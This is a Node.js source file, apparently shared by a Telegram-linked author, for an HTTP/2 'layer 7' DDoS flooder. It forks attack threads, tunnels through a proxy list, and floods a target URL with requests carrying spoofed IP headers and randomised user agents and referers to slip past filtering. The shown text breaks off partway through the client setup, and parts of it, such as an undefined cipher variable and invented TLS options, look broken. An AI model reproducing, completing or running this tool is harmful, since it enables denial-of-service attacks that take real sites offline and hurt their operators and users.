 //ORIGINAL MADE DDOS LAYER 7 METHOD BY t.me/LIService
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 var path = require("path");
 const crypto = require("crypto");
 const fs = require("fs");
 const axios = require('axios');
 const https = require('https');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });

 if (process.argv.length < 7){console.log(`
          ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
          ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
          ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/LIService                  
           
Usage: node LIService Target Time Ratelimit Threads ProxiesFile
Example: node LIService https://example.com 120 512 258 proxy.txt
`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }

 const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
  };

  const targetURL = process.argv[2];
  const agent = new https.Agent({ rejectUnauthorized: false });

  function getStatus() {
  const timeoutPromise = new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(new Error('Request Timed Out'));
    }, 5000);
  });

  const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { status, data } = response;
      console.log(`${getCurrentTime()} [LIService]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request Timed Out') {
        console.log(`${getCurrentTime()} [LIService]  Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [LIService]  Title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [LIService]  ${error.message}`);
      }
    });
}


 function getTitleFromHTML(html) {
   const titleRegex = /<title>(.*?)<\/title>/i;
   const match = html.match(titleRegex);
   if (match && match[1]) {
     return match[1];
   }
   return 'Not Found';
 }

function getRandomItem(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getRandomIP() {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }

 function getRandomNumberBetween(min,max){
     return Math.floor(Math.random()*(max-min+1)+min);
 }
 
 function generateRequestId() {
    return 'req-' + Math.random().toString(36).substring(2, 15);
}

function generateCorrelationId() {
    return 'corr-' + Math.random().toString(36).substring(2, 15);
}

 function randomString(length) {
   var result = "";
   var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var charactersLength = characters.length;
   for (var i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   ;
   return result;
 }

 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
} 

 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
}


if (cluster.isMaster){
  console.clear();
  console.log(`
 
          ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
          ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
          ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/LIService                  
                        Press Ctrl+Z To Stop DDoS
`);
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [LIService]  Attack Thread ${i} Started`);
  }
  console.log(`${getCurrentTime()} [LIService]  The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [LIService]  The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 

const cplist = [
  // AES-GCM
  'TLS_AES_256_GCM_SHA384',
  'TLS_AES_128_GCM_SHA256',
  'ECDHE-RSA-AES128-GCM-SHA256',
  'ECDHE-ECDSA-AES128-GCM-SHA256',
  'ECDHE-RSA-AES256-GCM-SHA384',
  'ECDHE-ECDSA-AES256-GCM-SHA384',
  'DHE-RSA-AES128-GCM-SHA256',
  'DHE-RSA-AES256-GCM-SHA384',
  
  // AES-CBC
  'ECDHE-RSA-AES128-SHA256',
  'ECDHE-RSA-AES256-SHA384',
  'ECDHE-RSA-AES256-SHA',
  'ECDHE-RSA-AES128-SHA',
  'DHE-RSA-AES128-SHA256',
  'DHE-RSA-AES256-SHA256',
  'DHE-RSA-AES256-SHA',
  'ECDHE-ECDSA-AES128-SHA256',
  'ECDHE-ECDSA-AES256-SHA384',
  'ECDHE-ECDSA-AES256-SHA',
  
  // RC4
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  
  // ChaCha20
  'EECDH+CHACHA20',
  'TLS_CHACHA20_POLY1305_SHA256',
  
  // GOST
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
  
  // Others
  'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS'
];

const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_brainpoolP256r1tls13_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_brainpoolP384r1tls13_sha384',
  'ecdsa_secp521r1_sha512',
  'ecdsa_sha1',
  'ecdsa_sha224',
  
  'rsa_pss_rsae_sha256',
  'rsa_pkcs1_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pkcs1_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha512',
  'rsa_pkcs1_sha1',
  'rsa_pss_pss_sha256',
  'rsa_pss_pss_sha384',
  'rsa_pkcs1_sha2240',
  
  'dsa_sha256',
  'dsa_sha384',
  'dsa_sha512',
  'dsa_sha224',
  'dsa_sha1',
  
  'ed25519',
  'ed448',
  
  'sm2sig_sm3'
];

const accept = "application/json, text/plain, */*";
const lang = "en-US,en;q=0.9";
const encoding = "gzip, deflate, br";
const control = "no-cache";

function getRandomReferer() {
    const referers = [
        "https://www.google.com",
        "https://www.bing.com",
        "https://www.yahoo.com",
        "https://www.facebook.com",
        "https://www.twitter.com",
        "https://www.linkedin.com",
        "https://example.com",
        "https://www.reddit.com",
        "https://www.quora.com",
        "https://www.stackoverflow.com",
        "https://www.medium.com",
        "https://www.wikipedia.org",
        "https://www.github.com",
        "https://www.gitlab.com",
        "https://www.bitbucket.org",
        "https://news.ycombinator.com",
        "https://www.pinterest.com",
        "https://www.tumblr.com",
        "https://www.etsy.com",
        "https://www.flickr.com",
        "https://www.vimeo.com",
        "https://www.dailymotion.com",
        "https://www.ted.com",
        "https://www.huffpost.com",
        "https://www.buzzfeed.com",
        "https://www.theverge.com",
        "https://www.techcrunch.com",
        "https://www.washingtonpost.com",
        "https://www.nytimes.com",
        "https://www.theguardian.com",
        "https://www.bbc.com",
        "https://www.cnn.com",
        "https://www.nbcnews.com",
        "https://www.forbes.com",
        "https://www.businessinsider.com",
        "https://www.bloomberg.com",
        "https://www.wsj.com",
        "https://www.economist.com",
        "https://www.slate.com",
        "https://www.rollingstone.com",
        "https://www.npr.org",
        "https://www.reuters.com",
        "https://www.aljazeera.com",
        "https://www.cbsnews.com",
        "https://www.abcnews.go.com",
        "https://www.wired.com",
        "https://www.smithsonianmag.com",
        "https://www.mashable.com",
        "https://www.theatlantic.com",
        "https://www.thehill.com",
        "https://www.marketwatch.com",
        "https://www.foxnews.com",
        "https://www.espn.com",
        "https://www.sports.yahoo.com",
        "https://www.livemint.com",
        "https://www.independent.co.uk",
        "https://www.irishtimes.com",
        "https://www.dw.com",
        "https://www.rt.com",
        "https://www.thedailybeast.com",
        "https://www.bbc.co.uk",
        "https://www.nature.com",
        "https://www.sciencemag.org",
        "https://www.lancet.com",
        "https://www.cell.com",
        "https://www.jstor.org",
        "https://www.springer.com",
        "https://www.sciencedaily.com",
        "https://www.britannica.com",
        "https://www.encyclopedia.com",
        "https://www.coursera.org",
        "https://www.udemy.com",
        "https://www.khanacademy.org",
        "https://www.edx.org",
        "https://www.tedx.com",
        "https://www.mit.edu",
        "https://www.stanford.edu",
        "https://www.harvard.edu",
        "https://www.ox.ac.uk",
        "https://www.cambridge.org",
        "https://www.eurekalert.org",
        "https://www.smithsonianmag.com",
        "https://www.si.edu",
        "https://www.nhm.ac.uk",
        "https://www.nhm.ac.uk",
        "https://www.royalsocietypublishing.org",
        "https://www.wiley.com",
        "https://www.cambridge.org",
        "https://www.oup.com",
        "https://www.springernature.com",
        "https://www.nature.com",
        "https://www.sciencedirect.com",
        "https://www.acs.org",
        "https://www.taylorandfrancis.com",
        "https://www.iop.org",
        "https://www.royalsocietypublishing.org"
    ];
    return getRandomItem(referers) + "/search?q=" + Math.random().toString(36).substring(7);
}

function getRandomUserAgent() {
    const userAgents = [
        // Windows
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", platform: "Windows" },
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/94.0.992.50", platform: "Windows" },
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko", platform: "Windows" },
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0", platform: "Windows" },
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36", platform: "Windows" },
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", platform: "Windows" },
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko", platform: "Windows" },
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 Edge/91.0.864.48", platform: "Windows" },
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", platform: "Windows" },
        { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36", platform: "Windows" },

        // macOS
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", platform: "macOS" },
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/93.0", platform: "macOS" },
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0", platform: "macOS" },
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36", platform: "macOS" },
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13.6; rv:90.0) Gecko/20100101 Firefox/90.0", platform: "macOS" },
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", platform: "macOS" },
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", platform: "macOS" },
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36", platform: "macOS" },
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36", platform: "macOS" },
        { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0", platform: "macOS" },

        // Linux
        { ua: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0", platform: "Linux" },
        { ua: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0", platform: "Linux" },
        { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0", platform: "Linux" },
        { ua: "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", platform: "Linux" },
        { ua: "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0", platform: "Linux" },
        { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0", platform: "Linux" },
        { ua: "Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0", platform: "Linux" },
        { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0", platform: "Linux" },
        { ua: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Chrome/90.0.4430.212 Safari/537.36", platform: "Linux" },
        { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Chrome/92.0.4515.107 Safari/537.36", platform: "Linux" },

        // iOS
        { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1", platform: "iOS" },
        { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1", platform: "iOS" },
        { ua: "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1", platform: "iOS" },
        { ua: "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1", platform: "iOS" },
        { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.7 Mobile/15E148 Safari/604.1", platform: "iOS" },
        { ua: "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.7 Mobile/15E148 Safari/604.1", platform: "iOS" },
        { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.7 Mobile/15E148 Safari/604.1", platform: "iOS" },
        { ua: "Mozilla/5.0 (iPad; CPU OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.7 Mobile/15E148 Safari/604.1", platform: "iOS" },
        { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 12_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.5 Mobile/15E148 Safari/604.1", platform: "iOS" },
        { ua: "Mozilla/5.0 (iPad; CPU OS 12_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.5 Mobile/15E148 Safari/604.1", platform: "iOS" },

        // Android
        { ua: "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36", platform: "Android" },
        { ua: "Mozilla/5.0 (Linux; Android 10; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36", platform: "Android" },
        { ua: "Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36", platform: "Android" },
        { ua: "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36", platform: "Android" },
        { ua: "Mozilla/5.0 (Linux; Android 7.1.1; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36", platform: "Android" },
        { ua: "Mozilla/5.0 (Linux; Android 6.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36", platform: "Android" },
        { ua: "Mozilla/5.0 (Linux; Android 5.1; Galaxy S5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Mobile Safari/537.36", platform: "Android" },
        { ua: "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", platform: "Android" },
        { ua: "Mozilla/5.0 (Linux; Android 4.3; Nexus 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36", platform: "Android" },
        { ua: "Mozilla/5.0 (Linux; Android 4.2.2; Nexus 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", platform: "Android" },
    ];
    return getRandomItem(userAgents);
}

function getRandomVia() {
    const viaValues = [
        "1.1 example.com",
        "1.1 proxy-12.com",
        "1.0 proxy-cache-34",
        "1.1 cache-server-22",
        "1.0 load-balancer-56",
        "1.1 edge-server-78",
        "1.0 cache-node-90",
        "1.1 gateway-43",
        "1.0 reverse-proxy-67",
        "1.1 cdn-server-89",
        "1.0 intermediate-cache-12",
        "1.1 forward-proxy-99",
        "1.0 network-appliance-34",
        "1.1 data-center-proxy-56",
        "1.0 application-gateway-78",
        "1.1 proxy-server-01",
        "1.0 edge-cache-23",
        "1.1 regional-proxy-45",
        "1.0 internet-gateway-67",
        "1.1 traffic-manager-89",
        "1.1 cloudfront",
        "1.0 api-gateway-12",
        "1.1 cache-edge-90",
        "1.0 gateway-proxy-54",
        "1.1 distributed-cache-34",
        "1.0 web-accelerator-78",
        "1.1 transit-proxy-56",
        "1.0 cloud-proxy-89",
        "1.1 regional-cache-01",
        "1.0 load-balancer-99",
        "1.1 vpn-server-02",
        "1.0 ad-cache-44",
        "1.1 proxy-farm-91",
        "1.0 web-accelerator-53",
        "1.1 proxy-reverse-65",
        "1.0 site-cache-12",
        "1.1 proxy-rack-87",
        "1.0 caching-server-34",
        "1.1 data-proxy-11",
        "1.0 cloud-cache-90",
        "1.1 node-cache-13",
        "1.0 edge-node-99",
        "1.1 enterprise-proxy-77",
        "1.0 app-server-54",
        "1.1 performance-proxy-66",
        "1.0 cache-proxy-23",
        "1.1 smart-cache-84",
        "1.0 secure-proxy-45",
        "1.1 network-cache-92",
        "1.0 high-speed-proxy-21",
        "1.1 load-distributor-03"
    ];
    return getRandomItem(viaValues);
}

function getRandomUpgrade() {
    const upgrades = [
        "websocket",
        "h2c",
        "HTTP/2.0",
        "h2",
        "SPDY/3.1",
        "QUIC",
        "HTTP/3",
        "TLS 1.3",
        "HTTP/1.1",
        "GRPC",
        "Brotli",
        "WebTransport",
        "H2-Settings",
        "HTTP/2+TLS",
        "HTTPS/1.3",
        "TLS 1.2",
        "HTTP/2.1",
        "HTTP/2+GRPC",
        "HTTP/2+WebSocket",
        "HTTP/3+QUIC",
        "HTTP/3.1",
        "HTTP/4.0",
        "SPDY/4.0",
        "Brotli+WebSocket",
        "GRPC-Web",
        "WebSocket+TLS",
        "HTTP/2+GRPC-Web",
        "QUIC+HTTP/3",
        "HTTP/2+H2-Settings",
        "HTTP/3+TLS 1.3",
        "HTTP/3+Brotli",
        "GRPC+QUIC",
        "HTTP/4.1",
        "SPDY/4.1",
        "HTTP/2+WebTransport",
        "HTTP/2+QUIC",
        "QUIC+TLS 1.3",
        "HTTP/3+H2-Settings",
        "WebTransport+QUIC",
        "HTTP/3.0+TLS",
        "SPDY/3.2",
        "HTTP/2.2",
        "GRPC+TLS",
        "HTTP/3+SPDY",
        "HTTP/4.1+TLS",
        "WebSocket+HTTP/2",
        "HTTP/3+WebSocket",
        "QUIC+Brotli",
        "HTTP/3+WebTransport"
    ];
    return getRandomItem(upgrades);
}

 var proxies = readLines(args.proxyFile);
 let concu = sigalgs.join(':');
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(LIService) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
}

 const Socker = new NetSocket();
headers[":method"] = getRandomItem(["GET", "POST", "PUT", "DELETE"]);
headers[":path"] = parsedTarget.path;
headers["origin"] = parsedTarget.host;
headers["Content-Type"] = getRandomItem(["application/json", "text/html", "application/xml"]);
headers[":scheme"] = getRandomItem(["http", "https"]);
headers["x-download-options"] = "noopen";
headers["Cross-Origin-Embedder-Policy"] = "require-corp";
headers["Cross-Origin-Opener-Policy"] = "same-origin";
headers["accept"] = getRandomItem(["application/json", "text/html"]);
headers["accept-language"] = getRandomItem(["en-US,en;q=0.9", "id-ID,id;q=0.9"]);
headers["Referrer-Policy"] = getRandomItem(["no-referrer", "strict-origin-when-cross-origin"]);
headers["x-cache"] = getRandomItem(["MISS", "HIT"]);
headers["Content-Security-Policy"] = "default-src 'self'";
headers["accept-encoding"] = "gzip, deflate, br";
headers["cache-control"] = getRandomItem(["no-cache", "max-age=0"]);
headers["x-frame-options"] = getRandomItem(["DENY", "SAMEORIGIN"]);
headers["x-xss-protection"] = "1; mode=block";
headers["x-content-type-options"] = "nosniff";
headers["TE"] = "Trailers";
headers["pragma"] = "no-cache";
let userAgentData = getRandomUserAgent();
headers["sec-ch-ua-platform"] = userAgentData.platform;
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "same-origin";
headers["sec-ch-ua"] = "\"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\", \";Not A Brand\";v=\"99\"";
headers["sec-ch-ua-mobile"] = "?0";  // "?1" untuk mobile
headers["vary"] = "Accept-Encoding";
headers["x-requested-with"] = "XMLHttpRequest";
headers["Server"] = "nginx/1.19.10";
headers["strict-transport-security"] = "max-age=63072000; includeSubDomains; preload";
headers["access-control-allow-headers"] = "Content-Type";
headers["access-control-allow-origin"] = "*";
headers["Content-Encoding"] = "gzip";
headers["alt-svc"] = "h3-23=\":443\"; ma=2592000";
headers["X-Forwarded-For"] = getRandomIP();
headers["Client-IP"] = getRandomIP();
headers["Real-IP"] = getRandomIP();
//headers["Referer"] = getRandomReferer();
headers["Referer"] = parsedTarget.host;
headers["User-Agent"] = userAgentData.ua;
headers["Via"] = getRandomVia();
headers["Upgrade"] = getRandomUpgrade();
headers["sss"] = "your-custom-header-value";
headers["Sec-Websocket-Key"] = "randomGeneratedKey==";
headers["Sec-Websocket-Version"] = "13";
headers["Retry-After"] = Math.floor(Math.random() * 120).toString();
headers["X-RateLimit-Limit"] = "100";
headers["X-RateLimit-Remaining"] = Math.floor(Math.random() * 100).toString();
headers["X-RateLimit-Reset"] = Math.floor(Date.now() / 1000 + Math.random() * 3600).toString();
headers["Report-To"] = JSON.stringify({
    "group": "default",
    "max_age": 86400,
    "endpoints": [
        {
            "url": `https://${parsedTarget.host}/report`
        }
    ],
    "include_subdomains": true
});
headers["Expect-CT"] = `max-age=86400, report-uri="https://${parsedTarget.host}/report-ct"`;

const RateHeaders = {
    ":method": getRandomItem(["GET", "POST"]),
    ":scheme": "https",
    ":path": "/",
    ":authority": parsedTarget.host,
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "cache-control": "no-cache",
    "connection": "keep-alive",
    "dnt": "1",  // Do Not Track
    "upgrade-insecure-requests": "1",
    "referer": `https://${parsedTarget.host}`,
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "x-rate-limit": "1000", // Example rate limit header
    "x-request-id": generateRequestId(), // Example of a dynamic value
    "x-correlation-id": generateCorrelationId(), // Example of a dynamic value
    "x-client-ip": getRandomIP(), // Example of dynamic client IP
    //"x-geo-location": "latitude,longitude"    
};

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const DynHeaders = {
        ":method": getRandomItem(["GET", "POST", "PUT", "DELETE"]),
        ":scheme": "https",
        ":path": "/",
        ":authority": parsedTarget.host,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "referer": parsedTarget.host,
        "origin": parsedTarget.host, // Add the origin header
        "X-Forwarded-For": getRandomIP(),
        "X-Forwarded-Host": getRandomIP()
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 25
    };

    setTimeout(function() {
        process.exit(1);
    }, process.argv[3] * 1000);

    process.on('uncaughtException', function(er) {});
    process.on('unhandledRejection', function(er) {});

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
            ALPNProtocols: ['h3-25', 'h3-24', 'h3-23', 'h3', 'h2', 'http/1.1', 'http/1.0', 'spdy/3', 'spdy/2', 'spdy/3.1'],
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
            servername: url.hostname,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            sigals: concu,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            sessionTimeout: 5000,
        };

        const createClient = () => {
            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

            tlsConn.setKeepAlive(true, 60 * 10000);

            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                },
                maxSessionMemory: 64000,
